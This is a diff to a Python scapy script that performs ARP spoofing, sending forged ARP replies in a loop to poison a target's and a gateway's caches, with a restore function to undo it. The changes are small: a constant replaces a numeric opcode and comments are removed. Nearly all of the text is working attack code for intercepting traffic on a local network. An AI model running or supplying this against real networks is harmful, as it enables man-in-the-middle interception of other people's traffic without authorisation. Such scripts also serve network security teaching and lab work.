@@ -19,19 +19,19 @@ def get_mac(ip):
 
 
 def spoof(t_ip, spoof_ip):
-    packet = ARP(op=2, pdst=t_ip, hwdst=get_mac(t_ip), psrc=spoof_ip)
+    packet = ARP(op=ARP.is_at, pdst=t_ip, hwdst=get_mac(t_ip), psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 
 
 def restore(destination_ip, source_ip):
     destination_mac = get_mac(destination_ip)
     source_mac = get_mac(source_ip)
-    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    packet = ARP(op=ARP.is_at, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
     scapy.send(packet, verbose=False)
 
 
-target_ip = "10.10.10.20"  # Enter your target IP
-gateway_ip = "10.10.10.254"  # Enter your gateway's IP
+target_ip = "10.10.10.20"
+gateway_ip = "10.10.10.254"
 
 try:
     sent_packets_count = 0
@@ -40,7 +40,7 @@ try:
         spoof(gateway_ip, target_ip)
         sent_packets_count = sent_packets_count + 2
         print("\r[*] Packets Sent " + str(sent_packets_count), end="")
-        time.sleep(2)  # Waits for two seconds
+        time.sleep(2)
 
 except KeyboardInterrupt:
     print("\nCtrl + C pressed.............Exiting")
